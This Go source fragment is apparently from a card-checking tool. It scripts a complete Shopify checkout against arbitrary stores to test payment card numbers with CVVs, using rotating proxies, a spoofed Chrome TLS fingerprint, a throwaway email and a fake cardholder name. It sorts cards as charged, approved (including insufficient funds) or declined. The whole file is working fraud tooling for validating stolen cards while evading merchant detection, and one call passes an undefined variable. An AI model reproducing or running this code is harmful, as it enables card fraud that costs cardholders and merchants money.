			fmt.Printf("[Proxy %d/%d] Failed: %v\n", i+1, len(proxies), err)
			continue
		}

		seen[proxyURL] = true
		working = append(working, proxyURL)
		fmt.Printf("[Proxy %d/%d] OK, added to rotation.\n", i+1, len(proxies))
	}

	if len(working) == 0 {
		return nil, fmt.Errorf("no working proxy found")
	}

	return working, nil
}

func runCheckoutForCard(shopURL, cardEntry, proxyURL string) (*CheckResult, error) {
	currency := "USD"
	country := "US"
	siteName := strings.TrimPrefix(strings.TrimPrefix(shopURL, "https://"), "http://")

	result := &CheckResult{
		Card:     cardEntry,
		ShopURL:  shopURL,
		SiteName: siteName,
		Currency: currency,
	}

	cardNumber, cardMonth, cardYear, cardCVV, err := parseCardEntry(cardEntry, path)
	if err != nil {
		result.Status = StatusError
		result.Error = err
		return result, err
	}

	// Fresh tls-client (curl-cffi equivalent) with its own cookie jar per run
	jar := tls_client.NewCookieJar()
	clOptions := []tls_client.HttpClientOption{
		tls_client.WithTimeoutSeconds(30),
		tls_client.WithClientProfile(profiles.Chrome_124),
		tls_client.WithCookieJar(jar),
	}
	if proxyURL != "" {
		clOptions = append(clOptions, tls_client.WithProxyUrl(proxyURL))
	}
	client, err := tls_client.NewHttpClient(tls_client.NewNoopLogger(), clOptions...)
	if err != nil {
		result.Status = StatusError
		result.Error = fmt.Errorf("failed to create tls client: %w", err)
		return result, result.Error
	}

	// Step 0
	title, _, variantID, price, err := findCheapestProduct(client, shopURL)
	_ = title
	if err != nil {
		result.Status = StatusError
		result.Retryable = true
		result.Error = fmt.Errorf("Step 0 failed: %w", err)
		return result, result.Error
	}

	// Step 1
	checkoutURL, checkoutToken, sessionToken, checkoutHTML, err := addToCartAndCheckout(client, shopURL, variantID)
	if err != nil {
		result.Status = StatusError
		result.Retryable = true
		result.Error = fmt.Errorf("Step 1 failed: %w", err)
		return result, result.Error
	}
	stableID := extractStableID(checkoutHTML)
	buildID := extractCommitSha(checkoutHTML)
	sourceToken := extractSourceToken(checkoutHTML)
	if stableID == "" || buildID == "" || sourceToken == "" {
		saveDebugResponse("checkout_html_step1", checkoutHTML)
		fmt.Printf("  [ERR] Step1 missing: stableID=%v buildID=%v sourceToken=%v shop=%s\n",
			stableID != "", buildID != "", sourceToken != "", shopURL)
		result.Status = StatusError
		result.Retryable = true
		result.Error = fmt.Errorf("Step 1 failed: missing stableId, buildId, or sourceToken")
		return result, result.Error
	}

	// Step 2
	patID := extractPrivateAccessTokenID(checkoutHTML)
	if patID == "" {
		result.Status = StatusError
		result.Retryable = true
		result.Error = fmt.Errorf("Step 2 failed: could not extract private_access_token id")
		return result, result.Error
	}
	_, err = fetchPrivateAccessToken(client, shopURL, checkoutURL, patID)
	if err != nil {
		result.Status = StatusError
		result.Retryable = true
		result.Error = fmt.Errorf("Step 2 failed: %w", err)
		return result, result.Error
	}

	// Step 3
	actionsURL := extractActionsJSURL(checkoutHTML, shopURL)
	if actionsURL == "" {
		result.Status = StatusError
		result.Retryable = true
		result.Error = fmt.Errorf("Step 3 failed: could not find actions JS URL")
		return result, result.Error
	}
	jsBody, err := fetchActionsJS(client, actionsURL, shopURL)
	if err != nil {
		result.Status = StatusError
		result.Retryable = true
		result.Error = fmt.Errorf("Step 3 failed: %w", err)
		return result, result.Error
	}
	proposalID := extractProposalID(jsBody)
	submitID := extractSubmitForCompletionID(jsBody)
	if proposalID == "" || submitID == "" {
		result.Status = StatusError
		result.Retryable = true
		result.Error = fmt.Errorf("Step 3 failed: missing Proposal or Submit ID")
		return result, result.Error
	}

	// Try to find PollForReceipt ID in the same actions JS first (newer Shopify bundles include it there).
	// If not found, scan all candidate processing/receipt JS bundles in priority order.
	pollForReceiptID := extractPollForReceiptID(jsBody)
	if pollForReceiptID == "" {
		processingURLs := extractProcessingJSURLs(checkoutHTML, shopURL)
		tried := 0
		for _, jsURL := range processingURLs {
			pjs, errPJS := fetchActionsJS(client, jsURL, shopURL)
			if errPJS != nil {
				continue
			}
			tried++
			if id := extractPollForReceiptID(pjs); id != "" {
				pollForReceiptID = id
				break
			}
		}
		if pollForReceiptID == "" {
			saveDebugResponse("checkout_html_no_pollid", checkoutHTML)
			fmt.Printf("  [ERR] PollForReceipt not found. candidates=%d tried=%d shop=%s\n", len(processingURLs), tried, shopURL)
			result.Status = StatusError
			result.Retryable = true
			result.Error = fmt.Errorf("%w: Step 3 failed: missing PollForReceipt ID (tried %d/%d bundles)", errStoreIncompatible, tried, len(processingURLs))
			return result, result.Error
		}
	}

	// Step 4
	_, proposalBody, err := sendProposal(client, shopURL, checkoutURL, checkoutToken, sessionToken, stableID, variantID, price, proposalID, buildID, sourceToken, currency, country)
	if err != nil {
		result.Status = StatusError
		result.Error = fmt.Errorf("Step 4 failed: %w", err)
		return result, result.Error
	}
	saveDebugResponse("proposal", proposalBody)

	if cur := extractSellerCurrency(proposalBody); cur != "" && cur != currency {
		currency = cur
	}
	if ctr := extractSellerCountry(proposalBody); ctr != "" && ctr != country {
		country = ctr
	}
	result.Currency = currency
	if currency == "USD" {
		if sellerPrice := extractSellerMerchandisePrice(proposalBody); sellerPrice != "" && sellerPrice != price {
			price = sellerPrice
		}
	}

	queueToken := extractQueueToken(proposalBody)
	if queueToken == "" {
		result.Status = StatusError
		result.Error = fmt.Errorf("Step 4 failed: could not extract queueToken")
		return result, result.Error
	}

	// Step 5
	email := "sadsjahk@gmail.com"
	_, proposal2Body, err := sendProposal2(client, shopURL, checkoutURL, checkoutToken, sessionToken, stableID, variantID, price, proposalID, buildID, sourceToken, queueToken, email, currency, country)
	if err != nil {
		result.Status = StatusError
		result.Error = fmt.Errorf("Step 5 failed: %w", err)
		return result, result.Error
	}
	saveDebugResponse("proposal2", proposal2Body)
	queueToken2 := extractQueueToken(proposal2Body)
	if queueToken2 == "" {
		result.Status = StatusError
		result.Error = fmt.Errorf("Step 5 failed: could not extract queueToken")
		return result, result.Error
	}

	// Step 6
	addr := addressForCountry(country)
	_, proposal3Body, err := sendProposal3(client, shopURL, checkoutURL, checkoutToken, sessionToken, stableID, variantID, price, proposalID, buildID, sourceToken, queueToken2, email, addr, currency, country)
	if err != nil {
		result.Status = StatusError
		result.Error = fmt.Errorf("Step 6 failed: %w", err)
		return result, result.Error
	}
	saveDebugResponse("proposal3", proposal3Body)
	queueToken3 := extractQueueToken(proposal3Body)
	if queueToken3 == "" {
		result.Status = StatusError
		result.Error = fmt.Errorf("Step 6 failed: could not extract queueToken")
		return result, result.Error
	}

	// Step 7
	time.Sleep(200 * time.Millisecond)
	_, proposal4Body, err := sendProposal3(client, shopURL, checkoutURL, checkoutToken, sessionToken, stableID, variantID, price, proposalID, buildID, sourceToken, queueToken3, email, addr, currency, country)
	if err != nil {
		result.Status = StatusError
		result.Error = fmt.Errorf("Step 7 failed: %w", err)
		return result, result.Error
	}
	saveDebugResponse("proposal4", proposal4Body)
	queueToken4 := extractQueueToken(proposal4Body)
	if queueToken4 == "" {
		result.Status = StatusError
		result.Error = fmt.Errorf("Step 7 failed: could not extract queueToken")
		return result, result.Error
	}

	// Step 8
	time.Sleep(200 * time.Millisecond)
	proposal5Status, proposal5Body, err := sendProposal3(client, shopURL, checkoutURL, checkoutToken, sessionToken, stableID, variantID, price, proposalID, buildID, sourceToken, queueToken4, email, addr, currency, country)
	if err != nil {
		result.Status = StatusError
		result.Error = fmt.Errorf("Step 8 failed: %w", err)
		return result, result.Error
	}
	_ = proposal5Status
	saveDebugResponse("proposal5", proposal5Body)

	// Step 9
	identSig := extractIdentificationSignature(checkoutHTML)
	if identSig == "" {
		result.Status = StatusError
		result.Error = fmt.Errorf("Step 9 failed: could not extract identification signature")
		return result, result.Error
	}

	pciStatus, pciBody, err := sendPCISession(identSig, cardNumber, "james anderson", cardMonth, cardYear, cardCVV, siteName, proxyURL)
	_ = pciStatus
	if err != nil {
		result.Status = StatusError
		result.Error = fmt.Errorf("Step 9 failed: %w", err)
		return result, result.Error
	}
	saveDebugResponse("pci_session", pciBody)

	pciSessionID := extractPCISessionID(pciBody)
	if pciSessionID == "" {
		result.Status = StatusError
		result.Error = fmt.Errorf("Step 9 failed: could not extract session ID")
		return result, result.Error
	}

	// Step 10
	queueToken5 := extractQueueToken(proposal5Body)
	if queueToken5 == "" {
		result.Status = StatusError
		result.Error = fmt.Errorf("Step 10 failed: could not extract queueToken")
		return result, result.Error
	}
	deliveryHandle := extractDeliveryHandle(proposal5Body)
	if deliveryHandle == "" {
		result.Status = StatusError
		result.Error = fmt.Errorf("%w: Step 10 failed: could not extract delivery handle", errStoreIncompatible)
		result.Retryable = true
		return result, result.Error
	}
	signedHandles := extractSignedHandles(proposal5Body)
	if len(signedHandles) == 0 {
		result.Status = StatusError
		result.Error = fmt.Errorf("%w: Step 10 failed: could not extract signedHandles", errStoreIncompatible)
		result.Retryable = true
		return result, result.Error
	}
	shippingAmount := extractShippingAmount(proposal5Body)
	if shippingAmount == "" {
		result.Status = StatusError
		result.Error = fmt.Errorf("%w: Step 10 failed: could not extract shipping amount", errStoreIncompatible)
		result.Retryable = true
		return result, result.Error
	}
	totalAmount := extractCheckoutTotal(proposal5Body)
	if totalAmount == "" {
		totalAmount = extractSellerTotal(proposal5Body)
	}
	if totalAmount == "" {
		result.Status = StatusError
		result.Error = fmt.Errorf("Step 10 failed: could not extract total amount")
		return result, result.Error
	}
	result.Amount = totalAmount

	attemptToken := generateAttemptToken(checkoutToken)
	submitStatus, submitBody, err := sendSubmitForCompletion(
		client, shopURL, checkoutURL, checkoutToken, sessionToken,
		stableID, variantID, price,
		submitID, buildID, sourceToken, queueToken5, email,
		addr,
		deliveryHandle, shippingAmount, totalAmount,
		pciSessionID, attemptToken, currency, country,
		signedHandles,
	)
	_ = submitStatus
	if err != nil {
		result.Status = StatusError
		result.Error = fmt.Errorf("Step 10 failed: %w", err)
		return result, result.Error
	}
	saveDebugResponse("submit", submitBody)
	checkSubmitErrors(submitStatus, submitBody)

	receiptID := extractReceiptID(submitBody)
	if receiptID == "" {
		result.Status = StatusError
		result.Error = fmt.Errorf("%w: Step 10 failed: could not extract receiptId", errMissingReceiptID)
		result.Retryable = true
		return result, result.Error
	}
	receiptSessionToken := extractReceiptSessionToken(submitBody)
	if receiptSessionToken == "" {
		result.Status = StatusError
		result.Error = fmt.Errorf("Step 10 failed: could not extract sessionToken")
		return result, result.Error
	}

	// Step 11 — Poll for receipt
	pollDelayRe := regexp.MustCompile(`"pollDelay"\s*:\s*(\d+)`)
	typeNameRe := regexp.MustCompile(`"__typename"\s*:\s*"(ProcessingReceipt|FailedReceipt|SuccessfulReceipt|ProcessedReceipt|ActionRequiredReceipt)"`)
	for pollNum := 1; ; pollNum++ {
		_, pollBody, err := sendPollForReceipt(
			client, shopURL, checkoutURL, checkoutToken, sessionToken,
			buildID, sourceToken,
			pollForReceiptID, receiptID, receiptSessionToken,
		)
		if err != nil {
			result.Status = StatusError
			result.Error = fmt.Errorf("poll %d failed: %w", pollNum, err)
			return result, result.Error
		}

		receiptType := ""
		if m := typeNameRe.FindStringSubmatch(pollBody); len(m) > 1 {
			receiptType = m[1]
		}
		statusCode := extractReceiptStatusCode(pollBody, receiptType)
		result.StatusCode = statusCode

		saveDebugResponse(fmt.Sprintf("poll%d", pollNum), pollBody)
		fmt.Printf("  [POLL %d] receiptType=%q statusCode=%q\n", pollNum, receiptType, statusCode)

		// Detect GraphQL schema mismatch (store running incompatible Shopify version) — retry on another site
		if receiptType == "" && strings.Contains(pollBody, `"errors"`) && strings.Contains(pollBody, "undefinedField") {
			result.Status = StatusError
			result.StatusCode = "SCHEMA_MISMATCH"
			result.Retryable = true
			result.Error = fmt.Errorf("%w: poll %d: GraphQL schema mismatch on this store", errStoreIncompatible, pollNum)
			return result, result.Error
		}

		if receiptType == "SuccessfulReceipt" || receiptType == "ProcessedReceipt" {
			fmt.Printf("  Poll %d Response:\n%s\n", pollNum, pollBody)
			result.Status = StatusCharged
			result.StatusCode = "ORDER_PLACED"
			return result, nil
		}
		if receiptType == "ActionRequiredReceipt" {
			fmt.Printf("  Poll %d Response:\n%s\n", pollNum, pollBody)
			result.Status = StatusApproved
			result.StatusCode = "APPROVED"
			return result, nil
		}
		if receiptType == "FailedReceipt" {
			fmt.Printf("  Poll %d Response:\n%s\n", pollNum, pollBody)
			errorCode := ""
			errorRe := regexp.MustCompile(`"code"\s*:\s*"([^"]+)"`)
			if m := errorRe.FindStringSubmatch(pollBody); len(m) > 1 {
				errorCode = m[1]
			}
			if errorCode == "" {
				errorCode = "FAILED"
			}

			switch errorCode {
			case "INSUFFICIENT_FUNDS":
				result.Status = StatusApproved
				result.StatusCode = errorCode
				return result, nil
			case "CAPTCHA_REQUIRED":
				result.Status = StatusDeclined
				result.StatusCode = errorCode
				result.Error = fmt.Errorf("declined: %s", errorCode)
				return result, result.Error
			case "GENERIC_ERROR":
				result.Status = StatusDeclined
				result.StatusCode = errorCode
				result.Error = fmt.Errorf("declined: %s", errorCode)
				return result, result.Error
			default:
				// Check for InventoryReservationFailure (no code field)
				if strings.Contains(pollBody, "InventoryReservationFailure") {
					result.Status = StatusError
					result.StatusCode = "INVENTORY_FAILURE"
					result.Retryable = true
					result.Error = fmt.Errorf("retryable: inventory reservation failure")
					return result, result.Error
				}
				// True decline (CARD_DECLINED, FRAUD_SUSPECTED, etc.)
				result.Status = StatusDeclined
				result.StatusCode = errorCode
				result.Error = fmt.Errorf("declined: %s", errorCode)
				return result, result.Error
			}
		}

		delay := 500
		if m := pollDelayRe.FindStringSubmatch(pollBody); len(m) > 1 {
			if d, err := strconv.Atoi(m[1]); err == nil && d > 0 {
				delay = d
			}
		}
		time.Sleep(time.Duration(delay) * time.Millisecond)

		if pollNum >= 60 {
			result.Status = StatusError
			result.Error = fmt.Errorf("exceeded 60 poll attempts")
			return result, result.Error
		}
	}
}
